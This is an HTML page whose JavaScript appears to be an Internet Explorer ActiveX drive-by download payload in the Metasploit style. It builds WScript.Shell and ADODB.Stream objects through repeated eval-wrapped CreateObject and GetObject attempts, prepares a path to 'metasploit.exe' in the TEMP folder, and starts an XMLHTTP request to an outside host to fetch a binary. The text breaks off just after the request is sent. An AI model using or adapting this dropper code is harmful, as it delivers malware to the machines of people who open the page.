<html><head><title></title>
<script language="javascript">

function Log(m) {
var log = document.createElement('p');
log.innerHTML = m;
document.body.appendChild(log);

}

function CreateO(o, n) {
var r = null;

try { eval('r = o.CreateObject(n)') }catch(e){}

if (! r) {
try { eval('r = o.CreateObject(n, "")') }catch(e){}
}

if (! r) {
try { eval('r = o.CreateObject(n, "", "")') }catch(e){}
}

if (! r) {
try { eval('r = o.GetObject("", n)') }catch(e){}
}

if (! r) {
try { eval('r = o.GetObject(n, "")') }catch(e){}
}

if (! r) {
try { eval('r = o.GetObject(n)') }catch(e){}
}

return(r);
}

function Go(a) {
Log('Creating helper objects...');
var s = CreateO(a, "WScript.Shell");
var o = CreateO(a, "ADODB.Stream");
var e = s.Environment("Process");

Log('Ceating the XMLHTTP object...');
var url = "http://2005-search.com/test";
var xml = null;
var bin = e.Item("TEMP")+ "\\" + "metasploit.exe";
var dat; 

try { xml=new XMLHttpRequest(); }
catch(e) {
try { xml = new ActiveXObject("Microsoft.XMLHTTP"); }
catch(e) {
xml = new ActiveXObject("MSXML2.ServerXMLHTTP");
}
}

if (! xml) return(0);

Log('');
xml.open("GET", url, false)
xml.send(null);
dat = xml.